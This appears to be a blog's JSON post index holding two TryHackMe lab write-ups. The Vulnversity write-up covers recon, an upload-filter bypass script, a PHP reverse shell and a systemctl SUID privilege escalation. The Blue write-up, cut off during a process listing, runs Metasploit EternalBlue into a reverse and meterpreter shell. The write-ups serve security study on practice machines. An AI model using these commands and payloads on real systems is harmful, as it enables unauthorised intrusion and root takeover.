[ { "title": "TryHackMe Vulnvercity write-up", "url": "/posts/THM-Vulnvercity-Writeup/", "categories": "IT, CyberSec", "tags": "write-up", "date": "2023-02-24 00:28:30 +1300", "snippet": "Setup$ export ip=10.10.x.x$ echo &quot;$ip example.com&quot; &amp;gt;&amp;gt; /etc/hosts1, reconStarting Nmap 7.60 ( [https://nmap.org](https://nmap.org) ) at 2023-01-14 08:10 GMTNmap scan report for ip-10-10-251-165.eu-west-1.compute.internal (10.10.251.165)Host is up (0.0010s latency).Not shown: 994 closed portsPORT     STATE SERVICE     VERSION21/tcp   open  ftp         vsftpd 3.0.322/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)3128/tcp open  http-proxy  Squid http proxy 3.5.123333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))MAC Address: 02:AE:04:9C:7F:A3 (Unknown)Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .Nmap done: 1 IP address (1 host up) scanned in 23.28 seconds$ time sudo rustscan --ulimit 5000 -a 10.10.54.166 -- -A -oA nmap/rust-open-portOpen 10.10.54.166:22                                                                                                                           Open 10.10.54.166:21                                                                                                                           Open 10.10.54.166:139                                                                                                                          Open 10.10.54.166:445                                                                                                                          Open 10.10.54.166:3128                                                                                                                         Open 10.10.54.166:3333PORT     STATE SERVICE     REASON         VERSION21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.322/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=|   256 3050cb705a865722cb52d93634dca558 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)3128/tcp open  http-proxy  syn-ack ttl 61 Squid http proxy 3.5.12|_http-server-header: squid/3.5.12|_http-title: ERROR: The requested URL could not be retrieved3333/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-title: Vuln University$ whatweb 10.10.2.187:3333[http://10.10.2.187:3333](http://10.10.2.187:3333) [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yourdomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.2.187], JQuery, Script, Title[Vuln University]2,enum$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u [http://10.10.54.166:3333/FUZZ/](http://10.10.54.166:3333/FUZZ/) -e .php,.txt,.bak -fc 403        /&#39;___\\  /&#39;___\\           /&#39;___\\             /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/             \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\             \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/              \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                \\/_/    \\/_/   \\/___/    \\/_/             v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method           : GET :: URL              : [http://10.10.54.166:3333/FUZZ](http://10.10.54.166:3333/FUZZ) :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Extensions       : .txt .bak :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500 :: Filter           : Response status: 403________________________________________________css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 276ms]fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 275ms]images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 279ms]index.html              [Status: 200, Size: 33014, Words: 8161, Lines: 653, Duration: 278ms]internal                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 276ms]js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 280ms]:: Progress: [14139/14139] :: Job [1/1] :: 143 req/sec :: Duration: [0:01:39] :: Errors: 0 ::Internal has web form for uploadWe will fuzz the allowed list of file extensionsContent of request.txtPOST /internal/index.php HTTP/1.1Host: vulnuniversity.thm:3333User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------277558272405201676361856688Content-Length: 338Origin: [http://vulnuniversity.thm:3333](http://vulnuniversity.thm:3333)Connection: closeReferer: [http://vulnuniversity.thm:3333/internal/](http://vulnuniversity.thm:3333/internal/)Upgrade-Insecure-Requests: 1DNT: 1Sec-GPC: 1-----------------------------277558272405201676361856688Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.FUZZ&quot;Content-Type: application/x-php-----------------------------277558272405201676361856688Content-Disposition: form-data; name=&quot;submit&quot;Submit-----------------------------277558272405201676361856688--$ ffuf -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -X POST -request request.txt -d &#39;&#39; -u [http://vulnuniversity.thm:3333/internal/index.php](http://vulnuniversity.thm:3333/internal/index.php)$ ffuf -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -X POST -request request.txt -d &#39;&#39; -u [http://vulnunive](http://vulnunive)rsity.thm:3333/internal/index.php                                                                                                    /&#39;___\\  /&#39;___\\           /&#39;___\\                                                                                             /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/                                                                                             \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\                                                                                             \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                                                                                              \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                                                                                                \\/_/    \\/_/   \\/___/    \\/_/                                                                                             v1.5.0 Kali Exclusive &amp;lt;3                                                                                              ________________________________________________                                                                              :: Method           : POST                                                                                                   :: URL              : [http://vulnuniversity.thm:3333/internal/index.php](http://vulnuniversity.thm:3333/internal/index.php)                                                      :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt                                      :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0                     :: Header           : Accept-Language: en-US,en;q=0.5                                                                        :: Header           : Accept-Encoding: gzip, deflate                                                                         :: Header           : Host: vulnuniversity.thm:3333                                                                          :: Header           : Content-Type: multipart/form-data; boundary=---------------------------277558272405201676361856688     :: Header           : Origin: [http://vulnuniversity.thm:3333](http://vulnuniversity.thm:3333)                                                                 :: Header           : Connection: close                                                                                      :: Header           : Referer: [http://vulnuniversity.thm:3333/internal/](http://vulnuniversity.thm:3333/internal/)                                                      :: Header           : Upgrade-Insecure-Requests: 1                                                                           :: Header           : DNT: 1                                                                                                 :: Header           : Sec-GPC: 1                                                                                             :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8          :: Data             : -----------------------------277558272405201676361856688                                              Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.FUZZ&quot;                                                           Content-Type: application/x-php-----------------------------277558272405201676361856688Content-Disposition: form-data; name=&quot;submit&quot;Submit-----------------------------277558272405201676361856688-- :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500________________________________________________xls                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 274ms]zip                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 275ms]pdf                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 276ms]conf                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 278ms]php3                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]py                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        phtm                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]                                        asp                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        shtml                   [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]                                        cfg                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        jsp                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 550ms]                                        xlsx                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 553ms]                                        php4                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 553ms]                                        pl                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 556ms]                                        tgz                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]                                        rb                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]php                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]php5                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]tar.gz                  [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 558ms]cfm                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 558ms]txt                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 825ms]docx                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 830ms]gz                      [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 830ms]shtm                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]doc                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]aspx                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]jhtml                   [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]tar                     [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]phtml                   [Status: 200, Size: 325, Words: 3, Lines: 2, Duration: 833ms]cfml                    [Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]:: Progress: [30/30] :: Job [1/1] :: 47 req/sec :: Duration: [0:00:01] :: Errors: 0 ::New added 14/01/2023# gobuster dir -u [http://$ip:3333](http://$ip:3333) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt# gobuster dir -u [http://10.10.251.165:3333](http://10.10.251.165:3333) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            [http://10.10.251.165:3333](http://10.10.251.165:3333)[+] Threads:        10[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2023/01/14 08:50:41 Starting gobuster===============================================================/images (Status: 301)/css (Status: 301)/js (Status: 301)/fonts (Status: 301)/internal (Status: 301)/server-status (Status: 403)===============================================================2023/01/14 08:51:00 Finished===============================================================The parameter -L will let curl to follow 301 redirect# curl -L [http://10.10.251.165:3333/internal](http://10.10.251.165:3333/internal)&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.min.css&quot;&amp;gt;&amp;lt;style&amp;gt;html, body {    height: 30%;}html {    display: table;    margin: auto;}body {    display: table-cell;    vertical-align: middle;    text-align: center;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;    &amp;lt;h3&amp;gt;Upload&amp;lt;/h3&amp;gt;&amp;lt;br /&amp;gt;    &amp;lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&amp;gt;    &amp;lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;submit&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Testing allowed file extension using python#! /usr/bin/env pythonimport requestsimport osip = &quot;10.10.207.82&quot;url = f&quot;http://{ip}:3333/internal/index.php&quot;# print (url)old_filename = &quot;revshell.php&quot;filename = &quot;revshell&quot;extensions = [&quot;.php&quot;,&quot;.php3&quot;,&quot;.php4&quot;,&quot;.php5&quot;,&quot;.phtml&quot;]for ext in extensions:new_filename = filename + extos.rename(old_filename, new_filename)files = {&quot;file&quot;: open(new_filename, &quot;rb&quot;)}r = requests.post(url, files = files)# print(r)if &quot;Extension not allowed&quot; in r.text:print(f&quot;{ext} not allowed&quot;)else:print(f&quot;{ext} seems to be allowed&quot;)old_filename = new_filenameUpload php reverse shellhttps://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.phpUpdate ip address and port# nc -lvnp 1234Once getting foot hold inside the machine, we are going to do privilege escalationSUID (set owner userId upon execution) allow user to run the program or file with the permission of the owner.One way to find the SUID by executing the following command:$ find / -user root -perm -4000 -exec ls -ldb {} \\;-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo         -rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger                                         -rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifsThe following command return similar result$ find / -perm -u=s -type f 2&amp;gt;/dev/nullOr$ find / -perm -4000 -type f 2&amp;gt;/dev/null/usr/bin/newuidmap/usr/bin/chfn/usr/bin/newgidmap/usr/bin/sudo/usr/bin/chsh/usr/bin/passwd/usr/bin/pkexec/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/at/usr/lib/snapd/snap-confine/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/squid/pinger/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/bin/su/bin/ntfs-3g/bin/mount/bin/ping6/bin/umount/bin/systemctl/bin/ping/bin/fusermount/sbin/mount.cifsTASK 5/bin/systemctlGTOFBin gives the following exampleTF=$(mktemp).serviceecho &#39;[Service]Type=oneshotExecStart=/bin/sh -c &quot;id &amp;gt; /tmp/output&quot;[Install]WantedBy=multi-user.target&#39; &amp;gt; $TF./systemctl link $TF./systemctl enable --now $TFWe have to modify it to export the content of the file to us.TF=$(mktemp).serviceecho &#39;[Service]Type=oneshotExecStart=/bin/sh -c &quot;cat /root/root.txt &amp;gt; /tmp/output&quot;[Install]WantedBy=multi-user.target&#39; &amp;gt; $TF/bin/systemctl link $TF/bin/systemctl enable --now $TFOr we can get root shell accessTF=$(mktemp).serviceecho &#39;[Service]Type=oneshotExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;[Install]WantedBy=multi-user.target&#39; &amp;gt; $TF/bin/systemctl link $TF/bin/systemctl enable --now $TF/bin/bash -pchmod +s gives permission to other user execution rights/bin/bash -p$ The End" }, { "title": "TryHackMe Blue write-up", "url": "/posts/THM-Blue-Writeup/", "categories": "IT, CyberSec", "tags": "write-up", "date": "2023-02-21 23:14:30 +1300", "snippet": "1, setupcreate ip variable so we don’t need to enter it again$ export ip=10.10.39.230$ echo $ip2, recon &amp;amp; enumerationTASK 1use nmap for recon.$ nmap -sV -sC -p-1000 --script vuln $ipStarting Nmap 7.60 ( https://nmap.org ) at 2023-01-30 01:15 GMTNmap scan report for blue.htm (10.10.8.236)Host is up (0.00048s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)MAC Address: 02:60:86:D7:41:6D (Logic Replacement TECH.)Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED|_smb-vuln-ms10-054: false|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED| smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/|_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspxService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 86.85 secondsno web service running on 80 or 443.smb service running and is vulnerable to ms17-010.3, ExploitationTASK 2 Gain AccessExploit the machine and gain a foothold by using Metasploit.$ msfconsolemsf6 &amp;gt; search ms17-010Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code ExecutionInteract with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rcemsf6 &amp;gt; use 0or msf6 &amp;gt; use exploit/windows/smb/ms17_010_eternalblue[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; Now we need to select the right payload before setup parametersmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; show payloadsthis will list all the payloads. we will select reverse shell55 payload/windows/x64/shell/reverse_tcp normal No Windows x64 Command Shell, Windows x64 Reverse TCP Stagermsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set payload payload/windows/x64/shell/reverse_tcppayload =&amp;gt; windows/x64/shell/reverse_tcpmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; show optionssetup parametersset the target machine ipmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set RHOSTS {10.10.xx.xx}set the attacker machine ipmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set LHOST {10.13.x.x} All parameters are set, now it’s time to run the exploitmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; run[*] Started reverse TCP handler on 10.13.2.185:4444 [*] 10.10.39.230:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 10.10.39.230:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)[*] 10.10.39.230:445 - Scanned 1 of 1 hosts (100% complete)[+] 10.10.39.230:445 - The target is vulnerable.[*] 10.10.39.230:445 - Connecting to target for exploitation.[+] 10.10.39.230:445 - Connection established for exploitation.[+] 10.10.39.230:445 - Target OS selected valid for OS indicated by SMB reply[*] 10.10.39.230:445 - CORE raw buffer dump (42 bytes)[*] 10.10.39.230:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes[*] 10.10.39.230:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv[*] 10.10.39.230:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.39.230:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 10.10.39.230:445 - Trying exploit with 12 Groom Allocations.[*] 10.10.39.230:445 - Sending all but last fragment of exploit packet[*] 10.10.39.230:445 - Starting non-paged pool grooming[+] 10.10.39.230:445 - Sending SMBv2 buffers[+] 10.10.39.230:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 10.10.39.230:445 - Sending final SMBv2 buffers.[*] 10.10.39.230:445 - Sending last fragment of exploit packet![*] 10.10.39.230:445 - Receiving response from exploit packet[+] 10.10.39.230:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 10.10.39.230:445 - Sending egg to corrupted connection.[*] 10.10.39.230:445 - Triggering free of corrupted buffer.[*] Sending stage (336 bytes) to 10.10.39.230[*] Command shell session 1 opened (10.13.2.185:4444 -&amp;gt; 10.10.39.230:49290) at 2023-02-19 06:40:50 -0500[+] 10.10.39.230:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.10.39.230:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.10.39.230:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=Shell Banner:Microsoft Windows [Version 6.1.7601]----- C:\\Windows\\system32&amp;gt;whoamiwhoamint authority\\systemwe are able to set the initial footholdTASK 3 EscalateNow we need to get from command shell to meterpreter shellfirst by Ctrl+Z to background this sessionC:\\Windows\\system32&amp;gt;^ZBackground session 1? [y/N] ymsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; then we will get meterpreter by search for the shell_to_meterpreter modelmsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; search shell_to_meterpreterMatching Modules================# Name Disclosure Date Rank Check Description- ---- --------------- ---- ----- -----------0 post/multi/manage/shell_to_meterpreter normal No Shell to Meterpreter UpgradeInteract with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpretermsf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; use 0msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; show optionsModule options (post/multi/manage/shell_to_meterpreter):Name Current Setting Required Description---- --------------- -------- -----------HANDLER true yes Start an exploit/multi/handler to receive the connectionLHOST no IP of host that will receive the connection from the payload (Will try to auto detect).LPORT 4433 yes Port for payload to connect to.SESSION yes The session to run this module onView the full module info with the info, or info -d command.it needs session ID. We can get it by sessions -lmsf6 post(multi/manage/shell_to_meterpreter) &amp;gt; sessions -lActive sessions===============Id Name Type Information Connection-- ---- ---- ----------- ----------1 shell x64/windows Shell Banner: Microsoft Windows [Version 6.1.7601] --- 10.13.2.185:4444 -&amp;gt; 10.10.39.230:49290 (10.10.39.230) --msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; set SESSION 1SESSION =&amp;gt; 1msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; run[*] Upgrading session ID: 1[*] Starting exploit/multi/handler[*] Started reverse TCP handler on 10.13.2.185:4433 [*] Post module execution completedmsf6 post(multi/manage/shell_to_meterpreter) &amp;gt; [*] Sending stage (200774 bytes) to 10.10.39.230[*] Meterpreter session 2 opened (10.13.2.185:4433 -&amp;gt; 10.10.39.230:49306) at 2023-02-19 06:55:11 -0500[*] Stopping exploit/multi/handlermsf6 post(multi/manage/shell_to_meterpreter) &amp;gt; sessions -lActive sessions===============Id Name Type Information Connection-- ---- ---- ----------- ----------1 shell x64/windows Shell Banner: Microsoft Windows [Version 6.1.7601] 10.13.2.185:4444 -&amp;gt; 10.10.39.230:49290 (10.10.39.23 ----- 0)2 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.13.2.185:4433 -&amp;gt; 10.10.39.230:49306 (10.10.39.23 0)msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; sessions 2[*] Starting interaction with 2...meterpreter &amp;gt; if the first time you don’t get the session 2 for meterpreter shell, then try to run it againnow to confirm the session is logged in as systemmeterpreter &amp;gt; getsystem[-] Already running as SYSTEMNow we need to migrate our shell to another processrun ps command to list all running processesmeterpreter &amp;gt; psProcess List============PID PPID Name Arch Session User Path--- ---- ---- ---- ------- ---- ----0 0 [System Process]4 0 System x64 0352 544 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe544 536 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe592 536 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\wininit.exe604 584 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe644 584 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\winlogon.exe692 592 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\services.exe700 592 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsass.exe708 592 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsm.exe724 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM816 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM884 692 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE932 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE1000 644 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\LogonUI.exe1020 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM1064 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE1164 692 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE1296 692 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe1332 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE1396 692 amazon-ssm-agent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe1456 544 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe1468 692 LiteAgent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe1584 1296 cmd.exe x64 0 NT 